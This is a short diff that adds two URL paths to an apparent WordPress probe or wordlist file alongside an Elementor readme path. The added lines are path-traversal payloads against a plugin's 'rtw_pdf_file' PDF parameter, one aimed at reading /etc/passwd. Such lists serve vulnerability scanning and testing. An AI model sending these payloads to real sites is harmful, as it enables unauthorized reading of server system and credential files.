@@ -1,1 +1,3 @@
 /wp-content/plugins/elementor/readme.txt
+/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../etc/passwd
+/elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=../../../../../../../../../../../../../../path/to/file
